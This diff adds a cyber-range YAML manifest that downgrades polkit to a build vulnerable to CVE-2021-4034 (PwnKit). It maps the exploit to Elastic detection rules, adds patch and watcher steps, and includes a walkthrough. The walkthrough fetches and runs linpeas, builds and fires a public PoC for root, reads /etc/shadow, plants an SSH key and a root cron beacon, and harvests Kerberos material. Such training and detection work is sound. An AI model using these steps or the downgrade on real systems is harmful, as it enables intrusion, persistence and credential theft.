@@ -1,0 +1,503 @@
+# Bolt-on: PwnKit — polkit pkexec LPE (CVE-2021-4034)
+# ---------------------------------------------------
+# Install downgrades policykit-1 to 0.105-31ubuntu0.1 (vulnerable build).
+# pkexec is SUID root by default; a crafted argv[0]==NULL invocation
+# triggers an out-of-bounds env-var read that lets a local unprivileged
+# user gain a root shell — CVE-2021-4034 / PwnKit (T1068).
+#
+# WARNING: downgrading policykit-1 may break some GUI session managers
+# (gdm/lightdm/gnome-shell) that depend on a newer polkit ABI. Use only
+# on dedicated lab hosts.
+#
+# Patch reinstalls the current packaged policykit-1, holds it via
+# apt-mark, and adds /etc/cron.daily/bolton-pwnkit-watch that warns if
+# the installed version regresses back to a known-vulnerable build.
+#
+# Elastic rule UUIDs sampled from:
+#   Research/elastic-detection-rules/rules/linux/execution_unusual_pkexec_execution.toml
+#   Research/elastic-detection-rules/rules/linux/privilege_escalation_pkexec_envar_hijack.toml
+#   Research/elastic-detection-rules/rules/linux/discovery_polkit_version_discovery.toml
+
+id: bolton.known-cve.pwnkit
+slug: pwnkit
+name: "PwnKit — polkit pkexec LPE (CVE-2021-4034)"
+version: "1.0.0"
+author: "Red Team Infra"
+last_updated: 2026-05-23
+
+category: known-cve
+subcategory: polkit
+tags:
+  - pwnkit
+  - polkit
+  - pkexec
+  - cve-2021-4034
+  - privilege-escalation
+  - linux
+description: >
+  Forces a downgrade of policykit-1 to a known-vulnerable build
+  (0.105-31ubuntu0.1) so /usr/bin/pkexec (SUID root) becomes
+  exploitable via CVE-2021-4034 / PwnKit. A crafted invocation with
+  argv[0]==NULL and a controlled environment lets any local
+  unprivileged user gain a root shell. WARNING: package downgrade may
+  break some GUI session managers — use only on dedicated lab hosts
+  (MITRE T1068).
+
+cve:
+  - "CVE-2021-4034"
+references:
+  - "https://attack.mitre.org/techniques/T1068/"
+  - "https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt"
+  - "https://ubuntu.com/security/CVE-2021-4034"
+  - "https://github.com/berdav/CVE-2021-4034"
+
+mitre:
+  tactic:
+    id: TA0004
+    name: "Privilege Escalation"
+  technique:
+    id: T1068
+    name: "Exploitation for Privilege Escalation"
+
+detection:
+  coverage_status: covered
+  elastic_rules:
+    - rule_uuid: "8da41fc9-7735-4b24-9cc6-c78dfc9fc9c9"
+      rule_name: "Potential Privilege Escalation via PKEXEC"
+      rule_filename: "linux/privilege_escalation_pkexec_envar_hijack.toml"
+      coverage: full
+      confidence: high
+      last_validated: 2026-05-23
+      notes: "Fires on the pkexec envar-hijack primitive that PwnKit relies on."
+    - rule_uuid: "3ca81a95-d5af-4b77-b0ad-b02bc746f640"
+      rule_name: "Unusual Pkexec Execution"
+      rule_filename: "linux/execution_unusual_pkexec_execution.toml"
+      coverage: full
+      confidence: high
+      last_validated: 2026-05-23
+      notes: "Catches pkexec execve with empty argv — the canonical PwnKit signature."
+    - rule_uuid: "ca3bcacc-9285-4452-a742-5dae77538f61"
+      rule_name: "Polkit Version Discovery"
+      rule_filename: "linux/discovery_polkit_version_discovery.toml"
+      coverage: indirect
+      confidence: medium
+      last_validated: 2026-05-23
+      notes: "Catches the `pkexec --version` recon step attackers run to confirm vulnerable build."
+    - rule_uuid: "0f54e947-9ab3-4dff-9e8d-fb42493eaa2f"
+      rule_name: "Polkit Policy Creation"
+      rule_filename: "linux/persistence_polkit_policy_creation.toml"
+      coverage: indirect
+      confidence: low
+      last_validated: 2026-05-23
+      notes: "Catches post-exploit polkit policy persistence sometimes paired with PwnKit."
+  signal_sources:
+    - "Auditd execve of /usr/bin/pkexec with argv[0] empty"
+    - "Auditd PATH_LOOKUP for pkexec triggered with PATH=GCONV_PATH=. in env"
+    - "dpkg log — policykit-1 downgrade to 0.105-31ubuntu0.1"
+
+targets:
+  supported_os:
+    - family: linux
+      min_version: "20.04"
+      max_version: "24.04"
+  required_roles:
+    - linux_member
+    - standalone
+  required_services: []
+  required_domain_function_level: null
+
+depends_on: []
+conflicts_with: []
+
+side_effects:
+  global: false
+  network_visible: false
+  reboot_required: false
+
+install:
+  estimated_time_seconds: 120
+  steps:
+    - ansible_role: ansible.builtin.apt
+      description: "Refresh apt cache so the vulnerable archive build is locatable."
+      role_vars:
+        update_cache: true
+        cache_valid_time: 0
+    - ansible_role: ansible.builtin.shell
+      description: "Force downgrade policykit-1 to the vulnerable 0.105 build."
+      role_vars:
+        cmd: "DEBIAN_FRONTEND=noninteractive apt-get install -y --allow-downgrades policykit-1=0.105-31ubuntu0.1"
+        warn: false
+  verify:
+    probe: |
+      dpkg -l policykit-1 2>/dev/null | grep -E "^ii.*0\.105" && test -u /usr/bin/pkexec
+    timeout_seconds: 60
+    expect_exit_code: 0
+
+uninstall:
+  description: "Reinstall the current packaged policykit-1 (rolls forward off the vulnerable downgrade)."
+  estimated_time_seconds: 60
+  steps:
+    - ansible_role: ansible.builtin.apt
+      description: "Refresh apt cache."
+      role_vars:
+        update_cache: true
+        cache_valid_time: 0
+    - ansible_role: ansible.builtin.shell
+      description: "Reinstall current policykit-1 to roll forward."
+      role_vars:
+        cmd: "DEBIAN_FRONTEND=noninteractive apt-get install -y --reinstall policykit-1"
+        warn: false
+  verify:
+    probe: |
+      ! dpkg -l policykit-1 2>/dev/null | grep -E "^ii.*0\.105-31ubuntu0\.1\s" | grep -q .
+    timeout_seconds: 60
+    expect_exit_code: 0
+
+patch:
+  description: >
+    Reinstall the current packaged policykit-1, hold it with apt-mark
+    so unattended-upgrades + manual `apt install` cannot re-downgrade
+    it, and install /etc/cron.daily/bolton-pwnkit-watch that checks the
+    installed dpkg version against a known-vulnerable set and
+    syslog-warns on any regression. Ubuntu Security Notice USN-5252-1
+    is the authoritative reference.
+  patch_reference:
+    - "https://ubuntu.com/security/notices/USN-5252-1"
+    - "https://attack.mitre.org/mitigations/M1051/"
+  complexity: low
+  side_effects:
+    - "policykit-1 marked HOLD — `apt upgrade` will skip it until manually unheld"
+    - "Daily cron job at ~06:25 warns on regression to vulnerable build"
+    - "Syslog entries tagged 'bolton-pwnkit-watch' on regression"
+  rollback_supported: true
+  steps:
+    - ansible_role: ansible.builtin.apt
+      description: "Refresh apt cache."
+      role_vars:
+        update_cache: true
+        cache_valid_time: 0
+    - ansible_role: ansible.builtin.shell
+      description: "Reinstall current policykit-1."
+      role_vars:
+        cmd: "DEBIAN_FRONTEND=noninteractive apt-get install -y --reinstall policykit-1"
+        warn: false
+    - ansible_role: ansible.builtin.shell
+      description: "Pin policykit-1 with apt-mark hold."
+      role_vars:
+        cmd: "apt-mark hold policykit-1"
+    - ansible_role: ansible.builtin.copy
+      description: "Install daily pwnkit-watch CI."
+      role_vars:
+        dest: "/etc/cron.daily/bolton-pwnkit-watch"
+        content: |
+          #!/bin/sh
+          # bolton-pwnkit-watch — warn if policykit-1 regresses to a known-vulnerable build
+          ver=$(dpkg-query -W -f='${Version}' policykit-1 2>/dev/null || echo none)
+          case "$ver" in
+            0.105-31ubuntu0.1|0.105-31|0.105-26ubuntu1.2|0.105-26ubuntu1.1|0.105-26ubuntu1)
+              logger -t bolton-pwnkit-watch "VULNERABLE: policykit-1 version $ver is CVE-2021-4034"
+              ;;
+          esac
+          # Confirm hold still in place.
+          if ! apt-mark showhold | grep -qx policykit-1; then
+            logger -t bolton-pwnkit-watch "WARNING: policykit-1 no longer on apt hold"
+          fi
+        owner: root
+        group: root
+        mode: "0755"
+  verify:
+    probe: |
+      ! dpkg -l policykit-1 2>/dev/null | grep -E "^ii.*0\.105-31ubuntu0\.1\s" | grep -q . && apt-mark showhold 2>/dev/null | grep -qx policykit-1 && test -x /etc/cron.daily/bolton-pwnkit-watch
+    timeout_seconds: 60
+    expect_exit_code: 0
+  exploit_probe_after_patch: "webapp/bolton/exploit_probes/pwnkit_check.sh"
+
+patch_revert:
+  description: "Unhold policykit-1, remove the watcher, and re-downgrade to the vulnerable build — PwnKit one-shot exploitation works again."
+  estimated_time_seconds: 60
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Remove the watcher."
+      role_vars:
+        path: "/etc/cron.daily/bolton-pwnkit-watch"
+        state: absent
+    - ansible_role: ansible.builtin.shell
+      description: "Unhold policykit-1."
+      role_vars:
+        cmd: "apt-mark unhold policykit-1"
+    - ansible_role: ansible.builtin.shell
+      description: "Re-downgrade to the vulnerable build."
+      role_vars:
+        cmd: "DEBIAN_FRONTEND=noninteractive apt-get install -y --allow-downgrades policykit-1=0.105-31ubuntu0.1"
+        warn: false
+  verify:
+    probe: |
+      dpkg -l policykit-1 2>/dev/null | grep -E "^ii.*0\.105" | grep -q .
+    timeout_seconds: 60
+    expect_exit_code: 0
+  warning: "Local PwnKit (CVE-2021-4034) exploitation via /usr/bin/pkexec works again. GUI session managers may misbehave on this downgrade."
+
+cost:
+  storage_mb: 8
+  cpu_pct: 1
+  detectability: loud
+
+curriculum:
+  title: "PwnKit — Local Root via polkit pkexec (CVE-2021-4034)"
+  summary: >
+    Guided walkthrough of CVE-2021-4034 (PwnKit) against tllinux01
+    (10.99.50.13). Starting from a low-privilege SSH session as appuser,
+    you enumerate the vulnerable polkit build, build/launch a PwnKit
+    exploit, pop a root shell, and review the auditd + Elastic detection
+    surface. Last step covers patching (USN-5252-1) and ongoing monitoring.
+  learning_objectives:
+    - "Identify a vulnerable polkit build via dpkg + pkexec --version."
+    - "Explain WHY pkexec is exploitable (argv[0]==NULL + GCONV_PATH env injection)."
+    - "Compile and launch the canonical berdav PwnKit PoC against /usr/bin/pkexec."
+    - "Map the exploit primitive to Elastic rules and explain why the empty-argv signature is high fidelity."
+    - "Apply the patch (apt-mark hold + cron watcher) and verify the exploit no longer works."
+  prerequisites:
+    - "SSH access to tllinux01 (10.99.50.13) as appuser (password appuser123) via bastion"
+    - "Kali attack box (192.168.1.100) with gcc, git, scp installed"
+    - "linpeas.sh staged on the attacker (downloadable from peass-ng GitHub)"
+  estimated_total_minutes: 35
+  steps:
+    - id: "01-foothold-recon"
+      title: "Get a foothold + run linpeas"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 1 — Foothold + Linux enumeration
+
+        SSH in as the low-priv user via the bastion. On Linux the modern
+        equivalent of BOFs is a curated enum script — `linpeas.sh` from
+        peass-ng is the industry standard (it has supplanted the older
+        LinEnum.sh and linux-smart-enumeration but you can also pull those
+        for cross-checking).
+
+        ```bash
+        # From Kali (192.168.1.100), tunnel to tllinux01 via bastion
+        ssh -J ubuntu@<bastion-ip> appuser@10.99.50.13
+        # password: appuser123
+
+        # On tllinux01: grab linpeas straight from GitHub via the tunnel
+        curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \
+          -o /tmp/linpeas.sh
+        chmod +x /tmp/linpeas.sh
+        /tmp/linpeas.sh -a 2>/dev/null | tee /tmp/linpeas.out
+        ```
+
+        Scroll to the **Interesting Files / SUID** and **Software Versions
+        / CVE check** sections. linpeas surfaces pkexec automatically and
+        flags vulnerable polkit builds in red. Confirm manually:
+
+        ```bash
+        pkexec --version             # vulnerable: 0.105 / 0.120; patched: >= 0.121
+        dpkg -l policykit-1          # bolt-on pins 0.105-31ubuntu0.1
+        ls -la /usr/bin/pkexec       # -rwsr-xr-x → SUID root, target acquired
+        ```
+
+        > **Note on Cobalt Strike:** CS beacons are Windows-only. For Linux
+        > implants the modern operator stack is **Sliver** (BishopFox) — it
+        > supports Linux beacons over mTLS/HTTPS and exposes a similar
+        > task-oriented workflow. Everything in this walkthrough runs over
+        > a plain reverse shell or SSH so you can replay it under any C2.
+
+        **Detection callout:** `pkexec --version` is captured by the
+        Elastic rule **Polkit Version Discovery** (UUID
+        `ca3bcacc-9285-4452-a742-5dae77538f61`) — defenders treat it as
+        recon-prep for PwnKit and pivot from there.
+      assessment:
+        question: "Which pkexec version is the cutoff for the PwnKit fix?"
+        options:
+          - "0.105 — anything older is patched"
+          - "0.120 — anything older is patched"
+          - "0.121 — anything older is vulnerable"
+          - "1.0 — anything older is vulnerable"
+        correct_index: 2
+        explanation: >
+          USN-5252-1 (Ubuntu) and upstream polkit 0.121 introduce the fix
+          that rejects pkexec invocations with empty argv. Anything
+          0.120 and earlier (including the lab's pinned 0.105-31ubuntu0.1)
+          is exploitable. `pkexec --version` is the fastest one-liner check.
+    - id: "02-stage-exploit"
+      title: "Stage the PwnKit PoC"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 2 — Build the canonical PoC
+
+        Multiple working PoCs exist. The most-cited public copies:
+
+        | Repo | Notes |
+        |---|---|
+        | `berdav/CVE-2021-4034` | Most-starred PoC, self-compiling Makefile |
+        | `arthepsy/CVE-2021-4034` | C reimplementation, very small |
+        | `blasty/PwnKit` | One-liner shell + inline base64 ELF |
+
+        Build berdav's PoC on the attacker box and SCP it over:
+
+        ```bash
+        # On Kali (192.168.1.100)
+        git clone https://github.com/berdav/CVE-2021-4034.git
+        cd CVE-2021-4034 && make
+        scp -J ubuntu@<bastion-ip> cve-2021-4034 appuser@10.99.50.13:/tmp/
+        ```
+
+        Alternatively, if you only have a beacon callback and no SCP,
+        compile **on** tllinux01 (gcc is already installed for the lab):
+
+        ```bash
+        # On tllinux01
+        cd /tmp && git clone https://github.com/berdav/CVE-2021-4034.git
+        cd CVE-2021-4034 && make
+        ```
+
+        The build drops a `cve-2021-4034` ELF plus a `GCONV_PATH=.`
+        directory tree that pkexec will dereference. Confirm:
+
+        ```bash
+        ls -la /tmp/CVE-2021-4034
+        # cve-2021-4034 (the launcher)
+        # GCONV_PATH=./ (the directory PoC writes into env)
+        ```
+
+        **Detection callout:** Auditd FILE_CREATE on the unusual
+        `GCONV_PATH=.` directory is a quiet signal — most Elastic rules
+        fire on the *execution* phase rather than the build artefacts.
+    - id: "03-fire-exploit"
+      title: "Fire PwnKit + verify root"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 3 — Pop root
+
+        ```bash
+        # On tllinux01 as appuser
+        cd /tmp/CVE-2021-4034
+        ./cve-2021-4034
+        # # id
+        # uid=0(root) gid=0(root) groups=0(root)
+        ```
+
+        The PoC invokes /usr/bin/pkexec with argv[0]==NULL plus a crafted
+        env containing `GCONV_PATH=./gconv-modules`. pkexec reads past the
+        end of argv into envp, treats the malicious GCONV path as a
+        trusted env var, and dlopens an attacker-controlled `.so` as root.
+        Quick lateral check:
+
+        ```bash
+        whoami                       # root
+        cat /etc/shadow | head -3    # root-readable now
+        ```
+
+        **Detection callout:** Two Elastic rules fire on this single
+        execve — **Unusual Pkexec Execution**
+        (`3ca81a95-d5af-4b77-b0ad-b02bc746f640`, catches empty argv) and
+        **Potential Privilege Escalation via PKEXEC**
+        (`8da41fc9-7735-4b24-9cc6-c78dfc9fc9c9`, catches the GCONV_PATH
+        envar hijack). Both are HIGH confidence — there is no benign
+        reason for either signature to appear.
+      assessment:
+        question: "What does PwnKit actually exploit in pkexec's argv handling?"
+        options:
+          - "A buffer overflow when argv[0] exceeds 1024 bytes"
+          - "An OOB read past argv when argc==0, dereferencing envp as if it were argv"
+          - "A race condition between pkexec and polkitd"
+          - "A symbolic link traversal in /etc/polkit-1/rules.d/"
+        correct_index: 1
+        explanation: >
+          pkexec assumes argc >= 1 and unconditionally accesses argv[1].
+          When you invoke it via execve with an empty argv array,
+          argv[0] is actually the first element of envp. pkexec then
+          treats attacker-controlled env strings as if they were
+          authenticated argv entries — including GCONV_PATH, which
+          glibc honours when loading character-set conversion modules.
+          The resulting dlopen happens with EUID=0.
+    - id: "04-persistence-pivot"
+      title: "Establish persistence + pivot"
+      estimated_minutes: 6
+      markdown: |
+        ## Step 4 — Make the foothold sticky
+
+        Once you have root, common post-exploit steps:
+
+        ```bash
+        # As root via the PwnKit shell on tllinux01
+        # 1. Plant an SSH key for direct root access (see ssh-authorized-key bolt-on)
+        mkdir -p /root/.ssh && chmod 700 /root/.ssh
+        echo "ssh-ed25519 AAAA...your-operator-key... operator@kali" \
+          >> /root/.ssh/authorized_keys
+        chmod 600 /root/.ssh/authorized_keys
+
+        # 2. Drop a root cron job (writable-cron bolt-on pattern)
+        echo '* * * * * root /tmp/.beacon.sh' > /etc/cron.d/sys-update
+
+        # 3. Pull credential material for lateral movement to the Windows DCs
+        cat /etc/krb5.conf 2>/dev/null
+        cat /etc/sssd/sssd.conf 2>/dev/null
+        # If the host is realm-joined, look for cached TGT in /tmp/krb5cc_*
+        ```
+
+        From tllinux01 you can now pivot to the Windows side of the lab
+        (`tldc01` 10.99.50.10, `tlms01` 10.99.50.11) using any
+        cached Kerberos material or by chaining the standard Impacket
+        toolkit over the existing SSH tunnel.
+
+        **Detection callout:** the SSH-key plant is caught by the
+        authorized_keys auditor (see the `ssh-authorized-key-planted`
+        bolt-on); the cron drop fires **Cron Job Created or Modified**
+        (`ff10d4d8-fea7-422d-afb1-e5a2702369a9`).
+    - id: "05-patch-mitigate"
+      title: "Blue-team: patch + monitor"
+      estimated_minutes: 10
+      markdown: |
+        ## Step 5 — Apply the patch + verify
+
+        Click the **Patch** action on this card. The bolt-on's patch
+        block:
+
+        1. `apt-get install --reinstall policykit-1` — installs the fixed
+           build (>= 0.105-31ubuntu0.1+esm or distro-current).
+        2. `apt-mark hold policykit-1` — prevents unattended-upgrades
+           from accidentally pulling the vulnerable version back.
+        3. Drops `/etc/cron.daily/bolton-pwnkit-watch` that syslog-warns
+           if `dpkg-query -W policykit-1` ever returns a known-vulnerable
+           version OR if the apt hold is removed.
+
+        Re-run Step 3:
+
+        ```bash
+        ./cve-2021-4034
+        # The value for the SHELL variable was not found the /etc/shells file
+        # — patched pkexec rejects the empty-argv invocation
+        ```
+
+        Detection sustainment beyond the patch:
+
+        - **Auditd rule** for monitoring: `-w /usr/bin/pkexec -p x -k pkexec_exec`
+          captures every pkexec execve including legitimate admin use.
+          Correlate on `argv[0]==""` or `GCONV_PATH` in env to alert.
+        - **Elastic Defend** ships the PwnKit signatures out of the box —
+          confirm the integration is enrolled on the Linux fleet.
+        - **CIS Benchmark 1.5.1** recommends `apt-mark hold` on
+          security-critical packages exactly to prevent silent
+          downgrades; PwnKit is the canonical case study.
+
+        > **Rollback:** the manifest declares `patch_revert` — re-arm the
+        > lab from the same card row to repeat the exercise.
+      assessment:
+        question: "Which control is MOST important to sustain after applying the polkit patch?"
+        options:
+          - "Restart polkitd daily to flush the cache"
+          - "Disable /usr/bin/pkexec entirely via chmod -s"
+          - "Pin policykit-1 with apt-mark hold + monitor for hold-removal and version regression"
+          - "Block outbound traffic from any process named pkexec"
+        correct_index: 2
+        explanation: >
+          The patch is only durable if unattended-upgrades cannot
+          accidentally pull the vulnerable build back, and if you have
+          telemetry that fires when the hold is removed. Stripping SUID
+          breaks every desktop privilege prompt; restarting polkitd
+          doesn't help; egress filtering for pkexec is meaningless (the
+          exploit is local). The apt-hold + watcher is the realistic
+          defence-in-depth pattern.
+
+status: stable
